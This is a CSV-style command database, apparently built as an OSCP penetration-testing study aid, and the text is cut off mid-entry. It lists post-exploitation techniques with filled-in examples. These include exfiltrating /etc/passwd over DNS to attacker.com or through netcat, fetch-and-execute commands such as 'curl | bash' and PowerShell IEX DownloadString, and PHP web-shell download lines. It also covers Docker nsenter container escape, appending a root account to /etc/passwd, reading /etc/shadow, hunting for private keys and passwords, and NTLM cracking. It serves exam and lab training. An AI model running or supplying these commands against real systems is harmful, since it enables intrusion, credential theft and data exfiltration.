"curl-upload","Curl File Upload","post-exploit","curl -X POST -F 'file=@<FILE>' http://<LHOST>:<PORT>/upload","Upload file using curl","general-transfer","curl -X POST -F 'file=@/etc/passwd' http://10.10.14.5:8000/upload","Requires upload handler on server","high","","","","","{""-X POST"": ""Use POST method"", ""-F"": ""Form data with file upload"", ""@"": ""Read from file"", ""-d"": ""Send data (alternative)""}","","[""wget-download"", ""nc-file-transfer"", ""base64-transfer""]",""
"certutil-download","Certutil Windows Download","post-exploit","certutil -urlcache -f http://<LHOST>:<PORT>/<FILE> <OUTPUT>","Download files on Windows using certutil","general-transfer","certutil -urlcache -f http://10.10.14.5:8000/shell.exe shell.exe","Built into Windows, often not blocked","high","","","","","{""-urlcache"": ""Use URL cache"", ""-f"": ""Force fetch from URL"", ""-split"": ""Split large files""}","[""python-http-server""]","[""powershell-download""]","[""win-privesc-winpeas"", ""win-systeminfo""]"
"powershell-download","PowerShell Download Methods","post-exploit","powershell -c ""Invoke-WebRequest -Uri http://<LHOST>:<PORT>/<FILE> -OutFile <OUTPUT>""","Download files using PowerShell","general-transfer","powershell -c ""Invoke-WebRequest -Uri http://10.10.14.5:8000/shell.ps1 -OutFile shell.ps1""","IWR alias for Invoke-WebRequest","high","","","","","{""-c"": ""Execute command"", ""Invoke-WebRequest"": ""PowerShell web cmdlet"", ""-Uri"": ""Target URL"", ""-OutFile"": ""Save to file""}","[""python-http-server""]","[""certutil-download""]","[""win-privesc-winpeas"", ""win-privesc-powerup""]"
"smb-server","Impacket SMB Server","post-exploit","impacket-smbserver share . -smb2support","Start SMB server for file transfers","general-transfer","","No authentication by default","high","","","","","{""share"": ""Share name"", ""."": ""Current directory to share"", ""-smb2support"": ""Enable SMB2 protocol"", ""-username"": ""Set authentication""}","","[""python-http-server"", ""ftp-transfer""]","[""certutil-download"", ""powershell-download""]"
"nc-file-transfer","Netcat File Transfer","post-exploit","nc -l -p <LPORT> > <FILE>","Receive file using netcat","general-transfer","nc -l -p 4444 > received_file","Simple but no progress indication","high","","","","","{""-l"": ""Listen mode"", ""-p"": ""Port number"", "">"": ""Redirect to file"", ""-v"": ""Verbose output""}","","[""wget-download"", ""base64-transfer""]","[""linux-privesc-linpeas""]"
"rdesktop-disk-share","RDesktop Disk Sharing","post-exploit","rdesktop -u <USERNAME> -p <PASSWORD> -r disk:share=<LOCAL_PATH> <TARGET>:<PORT>","Mount local directory in Windows RDP session for bidirectional file transfer","general-transfer","rdesktop -u administrator -p password123 -r disk:share=/home/kali/loot 192.168.45.100:3389","Share name 'share' becomes \\tsclient\share in Windows.

Port defaults to 3389 if omitted from command.","high","","","","{""Connection refused"": ""Verify port open: sudo nmap -p <PORT> -Pn -v <TARGET>"", ""Authentication failed"": ""Test credentials: crackmapexec smb <TARGET> -u <USERNAME> -p <PASSWORD>"", ""Access denied to \\\\tsclient\\share"": ""Drive redirection blocked by policy. Use alternative: smb-server"", ""RDP window doesn't open"": ""Check X11 display: echo $DISPLAY (should show :0 or similar)""}","{""-u"": ""Username for RDP authentication"", ""-p"": ""Password (omit to prompt securely)"", ""-r disk:share="": ""Mount local folder as network share in Windows session"", "":<PORT>"": ""Specify non-standard RDP port (default 3389 if omitted)"", ""-x l"": ""LAN speed optimization for faster transfers""}","","[""smb-server"", ""scp-transfer""]",""
"base64-transfer","Base64 Encoding Transfer","post-exploit","base64 -w0 <FILE> | nc <LHOST> <LPORT>","Transfer files using base64 encoding","general-transfer","base64 -w0 binary.exe | nc 10.10.14.5 4444","Useful for binary files over text protocols","high","","","","","{""-w0"": ""Disable line wrapping"", ""-d"": ""Decode mode"", ""|"": ""Pipe to netcat""}","","[""nc-file-transfer"", ""curl-upload""]",""
"ftp-transfer","FTP File Transfer","post-exploit","python3 -m pyftpdlib -p <PORT> -w","Start FTP server for file transfers","general-transfer","python3 -m pyftpdlib -p 21 -w","Install: pip install pyftpdlib","medium","","","","","{""-p"": ""Port number"", ""-w"": ""Allow write/upload"", ""-d"": ""Directory to serve"", ""-u"": ""Username""}","","[""python-m-simplehttpserver""]",""
"scp-transfer","SCP Secure Copy","post-exploit","scp <FILE> <USERNAME>@<TARGET>:/tmp/","Secure copy over SSH","general-transfer","scp exploit.sh user@192.168.1.100:/tmp/","Requires SSH credentials","medium","","","","","{""-r"": ""Recursive for directories"", ""-P"": ""Port specification"", ""-i"": ""Identity file (SSH key)"", ""-o"": ""SSH options""}","","",""
"php-download","PHP Download Script","post-exploit","<?php file_put_contents('<FILE>', file_get_contents('http://<LHOST>:<PORT>/<FILE>')); ?>","Download file using PHP","general-transfer","<?php file_put_contents('shell.php', file_get_contents('http://10.10.14.5:8000/shell.php')); ?>","Works in web shells","high","","","","","{""file_get_contents"": ""Read file/URL content"", ""file_put_contents"": ""Write content to file"", ""fopen"": ""Alternative function""}","[""python-http-server""]","[""wget-download"", ""curl-upload""]","[""linux-privesc-linpeas""]"
"perl-download","Perl Download","post-exploit","perl -e 'use LWP::Simple; getstore(""http://<LHOST>:<PORT>/<FILE>"", ""<OUTPUT>"");'","Download file using Perl","general-transfer","perl -e 'use LWP::Simple; getstore(""http://10.10.14.5:8000/exploit.pl"", ""exploit.pl"");'","LWP module may not be installed","medium","","","","","{""-e"": ""Execute Perl code"", ""LWP::Simple"": ""Web client module"", ""getstore"": ""Download and save function""}","","",""
"vbscript-download","VBScript Download (Windows)","post-exploit","echo Set x=CreateObject(""Microsoft.XMLHTTP""):x.Open ""GET"",""http://<LHOST>:<PORT>/<FILE>"",0:x.Send:Set s=CreateObject(""ADODB.Stream""):s.Type=1:s.Open:s.Write x.ResponseBody:s.SaveToFile ""<OUTPUT>"",2 > dl.vbs && cscript //nologo dl.vbs","Download file using VBScript on older Windows","general-transfer","echo Set x=CreateObject(""Microsoft.XMLHTTP""):x.Open ""GET"",""http://10.10.14.5:8000/shell.exe"",0:x.Send:Set s=CreateObject(""ADODB.Stream""):s.Type=1:s.Open:s.Write x.ResponseBody:s.SaveToFile ""shell.exe"",2 > dl.vbs && cscript //nologo dl.vbs","Works on Windows XP/2003","medium","","","","","{""Microsoft.XMLHTTP"": ""HTTP client object"", ""ADODB.Stream"": ""Binary stream object"", ""cscript"": ""Command line script host"", ""//nologo"": ""Suppress banner""}","","",""
"debug-exe-transfer","Debug.exe File Creation (Windows)","post-exploit","upx -9 <FILE> && exe2hex -x <FILE> -p <FILE>.cmd","Convert binary to debug.exe script for Windows XP/2003","general-transfer","upx -9 nc.exe && exe2hex -x nc.exe -p nc.exe.cmd","Limited to 64KB files","low","","","","","{""upx -9"": ""Compress binary (max compression)"", ""exe2hex"": ""Convert to debug script"", ""-x"": ""Input exe file"", ""-p"": ""Output cmd/powershell""}","","",""
"dns-exfiltration","DNS Exfiltration","post-exploit","cat <FILE> | xxd -p | while read line; do nslookup $line.<DOMAIN>; done","Exfiltrate data via DNS queries","general-transfer","cat /etc/passwd | xxd -p | while read line; do nslookup $line.attacker.com; done","Slow but stealthy","low","","","","","{""xxd -p"": ""Convert to hex"", ""nslookup"": ""DNS query tool"", ""while read"": ""Process line by line""}","","",""
"cat-etc-group","Cat Etc Group","post-exploit","cat /etc/group | grep docker","Privilege escalation technique via cat","privilege-escalation","","Auto-generated from full syntax text.

Source:
linux-docker-commands.json","high","","","","","","","[""check-docker-group""]","[""check-docker-socket"", ""docker-mount-escape""]"
"stat-var-run","Stat Var Run","post-exploit","stat /var/run/docker.sock","Privilege escalation technique via stat","privilege-escalation","","Auto-generated from full syntax text.

Source:
linux-docker-commands.json","high","","","","","","","[""linux-suid-find""]","[""check-docker-socket"", ""docker-run-v""]"
"docker-run-pid","Docker Nsenter Container Escape","post-exploit","docker run --pid=host -it <IMAGE_NAME> nsenter -t 1 -m -u -n -i sh","Escape Docker container to host system via nsenter by accessing host PID namespace","privilege-escalation","docker run --pid=host -it alpine nsenter -t 1 -m -u -n -i sh","Auto-generated from full syntax text.

Source:
linux-docker-commands.json","high","","","","","","[""check-docker-group"", ""list-docker-images""]","[""docker-run-pid-2"", ""docker-mount-escape"", ""docker-privileged-escape""]","[""verify-docker-root""]"
"cat-mnt-etc","Cat Mnt Etc","post-exploit","cat /mnt/etc/passwd","Execute cat for post-exploitation","general","","Auto-generated from full syntax text.

Source:
linux-docker-commands.json","high","","","","","","[""docker-mount-escape""]","","[""linux-enum-users-shells"", ""verify-docker-root""]"
"docker-run-pid-2","Docker Nsenter Container Escape","post-exploit","docker run --pid=host -it <IMAGE_NAME> nsenter -t 1 -m -u -n -i sh","Escape Docker container to host system via nsenter by accessing host PID namespace","privilege-escalation","docker run --pid=host -it alpine nsenter -t 1 -m -u -n -i sh","Auto-generated from full syntax text.

Source:
linux-docker-commands.json","high","","","","","","[""check-docker-group"", ""list-docker-images""]","[""docker-run-pid"", ""docker-mount-escape"", ""docker-privileged-escape""]","[""verify-docker-root""]"
"curl-t-file","Curl T File","post-exploit","curl -T <FILE> ftp://<LHOST>/","Transfer files using curl","data-exfiltration","curl -T payload.exe ftp://10.10.14.5/","Auto-generated from full syntax text.

Source:
general-transfer.json","medium","","","","","","","",""
"python-m-simplehttpserver","Python Simple HTTP Server","post-exploit","python -m SimpleHTTPServer","Start Python 2 HTTP server for file hosting and transfers","data-exfiltration","","Auto-generated from full syntax text.

Source:
general-transfer.json","medium","","","","","","","",""
"wget-via-php","Wget Via Php","post-exploit","wget via PHP: <?php system('wget http://<LHOST>/<FILE>'); ?>","Transfer files using wget","data-exfiltration","wget via PHP: <?php system('wget http://10.10.14.5/payload.exe'); ?>","Auto-generated from full syntax text.

Source:
general-transfer.json","medium","","","","","","","",""
"curl-via-php","Curl Via Php","post-exploit","curl via PHP: <?php system('curl -O http://<LHOST>/<FILE>'); ?>","Transfer files using curl","data-exfiltration","curl via PHP: <?php system('curl -O http://10.10.14.5/payload.exe'); ?>","Auto-generated from full syntax text.

Source:
general-transfer.json","medium","","","","","","","",""
"python-m-simplehttpserver-2","Python Simple HTTP Server","post-exploit","python -m SimpleHTTPServer 8000","Start Python 2 HTTP server for file hosting and transfers","data-exfiltration","","Auto-generated from full syntax text.

Source:
exfiltration.json","medium","","","","","","","",""
"curl-url-bash","Curl Url Bash","post-exploit","curl <URL> | bash","Transfer files using curl","data-exfiltration","curl http://10.10.10.100/file.txt | bash","Auto-generated from full syntax text.

Source:
exfiltration.json","medium","","","","","","","",""
"wget-url-o","Wget Url O","post-exploit","wget <URL> -O <FILE>","Transfer files using wget","data-exfiltration","wget http://10.10.10.100/file.txt -O payload.exe","Auto-generated from full syntax text.

Source:
exfiltration.json","medium","","","","","","","",""
"curl-url-o","Curl Url O","post-exploit","curl <URL> -o <FILE>","Transfer files using curl","data-exfiltration","curl http://10.10.10.100/file.txt -o payload.exe","Auto-generated from full syntax text.

Source:
exfiltration.json","medium","","","","","","","",""
"use-with-i","Use With I","post-exploit","Use with -i for SSH key: scp -i key.pem file target:/path","Transfer files using Use","data-exfiltration","","Auto-generated from full syntax text.

Source:
exfiltration.json","low","","","","","","","",""
"run-directly-lhost","Run Directly Lhost","post-exploit","\\\\<LHOST>\\share\\file.exe","Transfer files using Run","data-exfiltration","\\\\10.10.14.5\\share\\file.exe","Auto-generated from full syntax text.

Source:
exfiltration.json","low","","","","","","","",""
"socat-tcp-listen","Socat Tcp Listen","post-exploit","socat TCP-LISTEN:port,reuseaddr,fork file:output","Transfer files using socat","data-exfiltration","","Auto-generated from full syntax text.

Source:
exfiltration.json","low","","","","","","","",""
"whoami-all","Windows User Enumeration (Full)","post-exploit","whoami /all","Display complete user identity including groups, privileges, and SID","enumeration","","Auto-generated from full syntax text.

Source:
windows.json","medium","","","","","","","",""
"import-powerup-2","Import Powerup 2","post-exploit","PowerUp.ps1 Invoke-AllChecks","Enumerate system information using PowerUp.ps1","enumeration","","Auto-generated from full syntax text.

Source:
windows.json","low","","","","","","","",""
"sc-sdshow-service","Sc Sdshow Service","post-exploit","sc sdshow <service>","Execute sc for post-exploitation","general","","Auto-generated from full syntax text.

Source:
windows.json","low","","","","","","","",""
"dir-s-b","Dir S B","post-exploit","dir /s /b C:\*.dll 2>nul","Execute dir for post-exploitation","general","","Auto-generated from full syntax text.

Source:
windows.json","low","","","","","","","",""
"cat-etc-sudoers","Cat Etc Sudoers","post-exploit","cat /etc/sudoers","Privilege escalation technique via cat","privilege-escalation","","Auto-generated from full syntax text.

Source:
linux-sudo-commands.json","high","","","","","","","[""cat-etc-sudoers-2"", ""check-sudo-privs""]","[""analyze-sudoers"", ""gtfobins-sudo-lookup""]"
"ls-la-root","Ls La Root","post-exploit","ls -la /root/","Execute ls for post-exploitation","general","","Auto-generated from full syntax text.

Source:
linux-sudo-commands.json","low","","","","","","","",""
"cat-etc-shadow","Cat Etc Shadow","post-exploit","cat /etc/shadow","Attempt to read /etc/shadow file to extract password hashes","credential-dumping","","Auto-generated from full syntax text.

Source:
linux-sudo-commands.json","high","","","","","","","[""cat-etc-shadow-2""]","[""hashcat-crack"", ""john-single-crack""]"
"ls-la-root-2","Ls La Root 2","post-exploit","ls -la /root/","Execute ls for post-exploitation","general","","Auto-generated from full syntax text.

Source:
linux-suid-basic-commands.json","low","","","","","","","",""
"cat-etc-shadow-2","Cat Etc Shadow 2","post-exploit","cat /etc/shadow","Attempt to read /etc/shadow file to extract password hashes","credential-dumping","","Auto-generated from full syntax text.

Source:
linux-suid-basic-commands.json","high","","","","","","","[""cat-etc-shadow""]","[""hashcat-crack"", ""john-single-crack""]"
"find-path-name","Find Path Name","post-exploit","find <PATH> -name '*.php' -exec grep -i password {} +","Discover or extract credentials from target system","credential-dumping","find /var/www/html -name '*.php' -exec grep -i password {} +","Auto-generated from full syntax text.

Source:
credential-discovery.json","low","","","","","","","",""
"find-path-name-2","Find Path Name 2","post-exploit","find <PATH> -name 'config*' -exec cat {} +","Discover or extract credentials from target system","credential-dumping","find /var/www/html -name 'config*' -exec cat {} +","Auto-generated from full syntax text.

Source:
credential-discovery.json","low","","","","","","","",""
"getent-passwd-grep","Getent Passwd Grep","post-exploit","getent passwd | grep -v nologin | cut -d: -f1","Discover or extract credentials from target system","credential-dumping","","Auto-generated from full syntax text.

Source:
credential-discovery.json","low","","","","","","","",""
"grep-r-etc","Grep R Etc","post-exploit","grep -r '/etc/cron' /etc/","Enumerate system information using grep","enumeration","","Auto-generated from full syntax text.

Source:
linux.json","high","","","","","","","[""grep-r-etc"", ""grep-file""]","[""cat-file"", ""grep-r-private""]"
"echo-newroot-salt","Echo Newroot Salt","post-exploit","echo 'newroot:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd","Discover or extract credentials from target system","credential-dumping","","Auto-generated from full syntax text.

Source:
linux.json","high","","","","","","","","[""edit-etc-shadow""]"
"cat-proc-version","Cat Proc Version","post-exploit","cat /proc/version","Enumerate system information using cat","enumeration","","Auto-generated from full syntax text.

Source:
linux.json","medium","","","","","","","",""
"nmap-script-nfs","Nmap Script Nfs","post-exploit","nmap --script nfs-showmount","Enumerate system information using nmap","enumeration","","Auto-generated from full syntax text.

Source:
linux.json","medium","","","","","","","",""
"docker-run-v","Docker Run V","post-exploit","docker run -v /:/hostfs -it ubuntu bash","Privilege escalation technique via docker","privilege-escalation","","Auto-generated from full syntax text.

Source:
linux.json","high","","","","","","[""check-docker-group"", ""list-docker-images""]","[""docker-mount-escape""]","[""cat-mnt-etc"", ""verify-docker-root""]"
"find-name-authorized","Find Name Authorized","post-exploit","find / -name authorized_keys","Locate SSH authorized_keys files for credential discovery and persistence","credential-dumping","","Auto-generated from full syntax text.

Source:
linux.json","high","","","","","","","","[""ssh-key-authentication"", ""linux-ssh-keys""]"
"grep-r-private","Grep R Private","post-exploit","grep -r 'PRIVATE KEY' /home 2>/dev/null","Discover or extract credentials from target system","credential-dumping","","Auto-generated from full syntax text.

Source:
linux.json","high","","","","","","","[""grep-r-etc"", ""find-name-authorized""]","[""cat-file"", ""extract-ssh-key"", ""ssh2john-extract""]"
"cat-etc-sudoers-2","Cat Etc Sudoers 2","post-exploit","cat /etc/sudoers 2>/dev/null","Privilege escalation technique via cat","privilege-escalation","","Auto-generated from full syntax text.

Source:
linux.json","high","","","","","","","[""cat-etc-sudoers"", ""check-sudo-privs""]","[""analyze-sudoers"", ""gtfobins-sudo-lookup""]"
"cat-etc-os","Cat Etc Os","post-exploit","cat /etc/os-release","Execute cat for post-exploitation","general","","Auto-generated from full syntax text.

Source:
linux.json","low","","","","","","","",""
"wget-o-https","Wget O Https","post-exploit","wget -O - https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh","Download and execute LinPEAS privilege escalation enumeration script","data-exfiltration","","Auto-generated from full syntax text.

Source:
linux.json","high","","","","","","","[""curl-upload"", ""file-transfer-python-http""]","[""chmod-executable""]"
"watch-n-ps","Watch N Ps","post-exploit","watch -n 1 'ps aux | grep -v grep'","Enumerate system information using watch","enumeration","","Auto-generated from full syntax text.

Source:
linux.json","low","","","","","","","",""
"showmount-e-localhost","Showmount E Localhost","post-exploit","showmount -e localhost","Execute showmount for post-exploitation","general","","Auto-generated from full syntax text.

Source:
linux.json","low","","","","","","","",""
"ls-la-bin","Ls La Bin","post-exploit","ls -la /bin/systemctl","Privilege escalation technique via ls","privilege-escalation","","Auto-generated from full syntax text.

Source:
linux.json","high","","","","","","","[""linux-suid-find""]","[""gtfobins-lookup"", ""searchsploit-linux-capability""]"
"getcap-bin-systemctl","Getcap Bin Systemctl","post-exploit","getcap /bin/systemctl","Display Linux capabilities assigned to binary for privilege escalation identification","privilege-escalation","","Auto-generated from full syntax text.

Source:
linux.json","high","","","","","","[""linux-capabilities""]","[""linux-capabilities"", ""searchsploit-linux-capability""]","[""systemctl-service-permissions"", ""gtfobins-cap-lookup""]"
"find-etc-name","Find Etc Name","post-exploit","find /etc -name '*.sh' -exec grep '\*' {} \;","Execute find for post-exploitation","general","","Auto-generated from full syntax text.

Source:
linux.json","low","","","","","","","",""
"test-shadow-file","Test Shadow File","post-exploit","Test shadow file read: cat /etc/shadow 2>/dev/null | grep root","Attempt to read /etc/shadow file to extract password hashes","credential-dumping","","Auto-generated from full syntax text.

Source:
linux-capabilities-commands.json","high","","","","","","","[""cat-etc-shadow""]","[""cat-etc-shadow"", ""john-crack"", ""hashcat-crack""]"
"test-sudo-without","Test Sudo Without","post-exploit","sudo -l  # Test sudo without requiring password entry","List sudo privileges for current user without password prompt","privilege-escalation","","Auto-generated from full syntax text.

Source:
linux-capabilities-commands.json","high","","","","","","[""linux-sudo-list""]","[""linux-sudo-list"", ""gtfobins-sudo-lookup""]","[""sudo-exploit-find"", ""gtfobins-sudo-lookup""]"
"edit-etc-shadow","Edit Etc Shadow","post-exploit","Edit /etc/shadow instead if cap allows: remove root password hash","Discover or extract credentials from target system","credential-dumping","","Auto-generated from full syntax text.

Source:
linux-capabilities-commands.json","high","","","","","","[""echo-newroot-salt""]","","[""verify-root-access-sudo""]"
"use-cp-command","Use Cp Command","post-exploit","cp modified_passwd /etc/passwd","Execute Use for post-exploitation","general","","Auto-generated from full syntax text.

Source:
linux-capabilities-commands.json","high","","","","","","[""linux-sudo-list""]","[""tar-create""]","[""edit-etc-shadow""]"
"use-tar-to","Use Tar To","post-exploit","tar -xzf passwd.tar.gz -C /","Execute Use for post-exploitation","general","","Auto-generated from full syntax text.

Source:
linux-capabilities-commands.json","low","","","","","","","",""
"bash-dev-tcp-download","Bash /dev/tcp Download","post-exploit","exec 3<>/dev/tcp/<LHOST>/<PORT>; cat <&3 > <FILE>; exec 3<&-","Download file using Bash built-in /dev/tcp when curl/wget unavailable","data-exfiltration","exec 3<>/dev/tcp/10.10.14.5/8000; cat <&3 > payload.sh; exec 3<&-","Auto-generated supplemental command.

Requires Bash compiled with network support.

Alternative to curl/wget.","high","","","","","","","[""file-transfer-curl"", ""file-transfer-wget"", ""file-transfer-nc-push""]","[""linpeas-run"", ""linux-enum-users-shells"", ""check-sudo-privs""]"
"curl-insecure-ssl","Curl Insecure SSL Download","post-exploit","curl -k <URL> -o <FILE>","Download file ignoring SSL certificate validation errors","data-exfiltration","curl -k https://10.10.14.5:8443/payload.exe -o payload.exe","Auto-generated supplemental command.

Use when target has self-signed certificates.","medium","","","","","{""-k"": ""Insecure mode - skip SSL certificate validation"", ""-o"": ""Write output to file instead of stdout""}","","",""
"base64-file-transfer","Base64 File Transfer","post-exploit","base64 -w 0 <FILE>","Encode file to base64 for text-safe transfer via copy-paste or terminal","data-exfiltration","base64 -w 0 payload.exe","Auto-generated supplemental command.

Decode on target with:
base64 -d > file","high","","","","","{""-w 0"": ""Disable line wrapping for single-line output""}","","","[""base64-decode-file""]"
"base64-decode-file","Base64 Decode File","post-exploit","echo '<BASE64_STRING>' | base64 -d > <FILE>","Decode base64 string to binary file","data-exfiltration","echo 'SGVsbG8gV29ybGQ=' | base64 -d > payload.exe","Auto-generated supplemental command.

Companion to base64 encoding.","high","","","","","","[""base64-file-transfer""]","",""
"invoke-watson","Invoke-Watson Windows Vulnerability Scanner","post-exploit","powershell.exe -exec bypass -C ""IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/<PATH>/Watson.ps1'); Invoke-Watson""","Download and execute Watson PowerShell script to enumerate missing Windows patches and exploitable vulnerabilities","enumeration","powershell.exe -exec bypass -C ""IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/tools/Watson.ps1'); Invoke-Watson""","Auto-generated supplemental command.

Watson identifies CVEs and missing KB patches.

Alternative Techniques:
- sherlock.ps1","high","","","","","","","[""win-privesc-winpeas""]",""
"check-sudoers-readable","Check Sudoers File Readability","post-exploit","test -r /etc/sudoers && cat /etc/sudoers || echo 'Not readable'","Test if /etc/sudoers is readable and display contents if accessible","enumeration","","Auto-generated supplemental command.

Sudoers normally requires root access.","medium","","","","","","","",""
"find-suid-usr-bin","Find SUID Binaries in /usr/bin","post-exploit","find /usr/bin /usr/sbin -type f -perm -4000 -ls 2>/dev/null","Manually search /usr/bin and /usr/sbin for SUID binaries","privilege-escalation","","Auto-generated supplemental command.

Focused search in common system binary directories.","high","","","","","","","[""find-suid-binaries""]",""
"searchsploit-linux-capability","SearchSploit Linux Capability Exploits","post-exploit","searchsploit linux capability | grep -i <CAPABILITY>","Search exploit-db for Linux capability-based privilege escalation techniques","privilege-escalation","searchsploit linux capability | grep -i cap_setuid","Auto-generated supplemental command.

Search after identifying capabilities with getcap.","high","","","","","","[""getcap-bin-systemctl"", ""linux-capabilities""]","[""searchsploit"", ""gtfobins-lookup""]","[""gtfobins-cap-lookup"", ""systemctl-service-permissions""]"
"gtfobins-capability-lookup","GTFOBins Capability Technique Lookup","post-exploit","curl -s https://gtfobins.github.io/ | grep -A 20 '<BINARY>'","Query GTFOBins for alternative exploitation techniques for capability-enabled binary","privilege-escalation","curl -s https://gtfobins.github.io/ | grep -A 20 'python3'","Auto-generated supplemental command.

GTFOBins provides capability-based exploitation methods.

Offline version recommended for exam.","high","","","","","","","[""searchsploit-linux-capability""]",""
"capability-binary-verification","Verify Capability on Binary","post-exploit","getcap <BINARY_PATH> && ls -la <BINARY_PATH>","Verify identified capability and binary combination from previous enumeration steps","enumeration","getcap /usr/bin/python3.8 && ls -la /usr/bin/python3.8","Auto-generated supplemental command.

Verification step before exploitation.","medium","","","","","","","","[""searchsploit-linux-capability"", ""gtfobins-capability-lookup""]"
"powershell-wget-alias","PowerShell wget Alias Download","post-exploit","powershell.exe wget <URL> -OutFile <FILE>","Download file using PowerShell wget alias (wrapper for Invoke-WebRequest)","data-exfiltration","powershell.exe wget http://10.10.14.5/payload.exe -OutFile payload.exe","Auto-generated supplemental command.

wget is PowerShell alias for Invoke-WebRequest.","medium","","","","","","","[""certutil-download""]",""
"linux-cred-discover-config","Discover Credentials in Config Files","post-exploit","grep -r -i -E '(password|passwd|pwd|dbpass)' <SEARCH_PATH> 2>/dev/null","Search recursively for password strings in configuration files (PHP, config, env, etc.)","credential-access","grep -r -i -E '(password|passwd|pwd|dbpass)' /var/www/html 2>/dev/null","Common config file locations:
/var/www/html/config.php, /var/www/html/wp-config.php, /etc/*.conf, .env files.

Time estimate:
1-2 minutes.

OSCP tip:
Database credentials often reused for SSH.

Look for patterns:
password=, DB_PASS, dbpass, credentials, auth.

Check .git/config for credentials in URLs.","high","","","","{""Too many results"": ""Narrow search: grep -r 'DB_PASSWORD' /var/www/html/*.php"", ""Permission denied"": ""Run with sudo or target user-writable directories"", ""No results in common paths"": ""Try: /opt, /home/*/.bash_history, /tmp, /var/backups""}","{""-r"": ""Recursive - search all subdirectories"", ""-i"": ""Case insensitive - matches PASSWORD, password, Password, etc."", ""-E"": ""Extended regex - allows pattern matching with (password|passwd|pwd)"", ""2>/dev/null"": ""Suppress permission denied errors for cleaner output""}","","","[""linux-enum-users-shells"", ""ssh-login-password"", ""mysql-connect-basic"", ""postgres-connect-basic""]"
"linux-enum-users-shells","Enumerate Users with Login Shells","post-exploit","cat /etc/passwd | grep -v 'nologin\|false' | cut -d: -f1","Extract valid usernames from /etc/passwd that have real login shells (exclude service accounts)","enumeration","","Valid login shells typically:
/bin/bash, /bin/sh, /bin/zsh.

Service accounts use /usr/sbin/nologin or /bin/false.

Time estimate:
10 seconds.

OSCP tip:
Test discovered credentials against these users via SSH.

Common OSCP usernames:
user, admin, root, www-data (if shell granted).

Also check:
/home directories for personal data, .ssh/authorized_keys.","high","","","","{""Too many service accounts"": ""Add more filters: grep -v 'nologin\\|false\\|sync\\|shutdown\\|halt'"", ""Need UID ranges"": ""Show UIDs: awk -F: '$3 >= 1000 {print $1}' /etc/passwd (human users)"", ""Want full details"": ""Omit final cut: cat /etc/passwd | grep -v nologin (shows home dirs, shells)""}","{""cat /etc/passwd"": ""Display all user account information"", ""grep -v"": ""Invert match - exclude lines containing nologin or false shells"", ""cut -d: -f1"": ""Extract first field (username) using colon delimiter""}","","","[""ssh-login-password"", ""hydra-ssh""]"
"windows-hashcat-crack-ntlm","Crack NTLM Hash with Hashcat (Single Hash)","post-exploit","hashcat -m 1000 -a 0 <HASH_FILE> /usr/share/wordlists/rockyou.txt --force","Crack single NTLM password hash using dictionary attack with rockyou.txt wordlist. Mode 1000 is for NTLM hashes (32 hex characters). Use --force flag in VMs to bypass GPU checks. Hash cracks in seconds to hours depending on password complexity.","password-cracking","hashcat -m 1000 -a 0 dave_hash.txt /usr/share/wordlists/rockyou.txt --force","Hashcat is ESSENTIAL for OSCP but NOT required for Windows authentication. CRITICAL MINDSET: Use hash immediately for Pass-the-Hash while cracking runs in background. WORKFLOW: (1) Extract hash, (2) Start Hashcat in background: hashcat -m 1000 hash.txt rockyou.txt --force & disown, (3) Use hash with psexec/wmiexec NOW (don't wait), (4) Check progress later: hashcat -m 1000 hash.txt --show. Password cracking is for: (1) RDP access (requires plaintext), (2) Web apps (require plaintext), (3) Credential reuse (test plaintext on other systems), (4) Reporting (demonstrate weak passwords).

COMPLEXITY VS TIME:
- Weak (Password1, Welcome123): <1 minute with rockyou.txt
- Medium (P@ssw0rd!, Spring2024!): 1-30 minutes with rules (best64.rule)
- Strong (RandomPass123!@#): Hours to days (try combinator attack or larger wordlists)
- Very Strong (20+ random chars): UNCRACKABLE - use Pass-the-Hash instead

BACKGROUND EXECUTION:
bash -c 'hashcat -m 1000 hash.txt rockyou.txt --force > /tmp/hashcat.log 2>&1 & disown'
Monitor: tail -f /tmp/hashcat.log
Check status: hashcat -m 1000 hash.txt --show (lists cracked hashes)

RULES FOR BETTER SUCCESS:
hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
best64.rule: 64 common variations (uppercase, append numbers, leet speak)
dive.rule: 99,092 rules (comprehensive, slower)
OSCP-specific: Create custom rule for seasonal passwords (Spring2024, Fall2023)

MULTIPLE HASHES:
cat << EOF > hashes.txt
08d7a47a6f9f66b97b1bae4178747494
2892d26cdf84d7a70e2eb3b9f05c425e
1693c6cefafffc7af11ef34d1c788f47
EOF
hashcat -m 1000 hashes.txt rockyou.txt --force --show (displays all cracked)

TIME ESTIMATE: 10 seconds - 24 hours depending on password complexity. Weak passwords (<10 chars, dictionary words) crack in minutes.","high","","","","{""Hash not cracked (Status: Exhausted)"": ""Password not in rockyou.txt wordlist. SOLUTIONS: (1) Add rules to modify wordlist: hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule (tries variations: uppercase, append numbers, leet speak). (2) Try larger wordlist: weakpass_3.txt. (3) Use mask attack for known pattern: hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?l?d?d?d (8 chars: uppercase+4 lowercase+3 digits). (4) Accept hash is uncrackable and use Pass-the-Hash instead."", ""clCreateContext(): CL_DEVICE_NOT_FOUND"": ""No GPU detected or OpenCL not configured. IMMEDIATE FIX: Add --force flag (enables CPU mode). PERMANENT FIX: Install GPU drivers: sudo apt install nvidia-driver nvidia-cuda-toolkit (NVIDIA) OR sudo apt install rocm-opencl-runtime (AMD). VERIFY: hashcat -I (lists detected devices). OSCP NOTE: GPU not required, --force CPU mode cracks weak passwords in minutes."", ""ATTENTION! OpenCL kernel self-test failed"": ""GPU driver mismatch or virtualized GPU. SOLUTION: Use --force to bypass check and run in CPU mode. ALTERNATIVE: If physical GPU available, update drivers: sudo apt update && sudo apt full-upgrade. VERIFY drivers: nvidia-smi (NVIDIA) or rocm-smi (AMD). For OSCP VMs, always use --force."", ""No hashes loaded / Invalid hash format"": ""Hash file format incorrect. VERIFY: (1) Hash is exactly 32 hexadecimal characters (0-9, a-f). Check with: wc -c hash.txt (should output 33 with newline). (2) No colons, no username, no spaces: CORRECT: 08d7a47a6f9f66b97b1bae4178747494. WRONG: dave:1103:aad3...:08d7... (full format). (3) Use: echo '<HASH>' | xxd to verify hex encoding. EXTRACT NTLM from full format: cat secretsdump.txt | cut 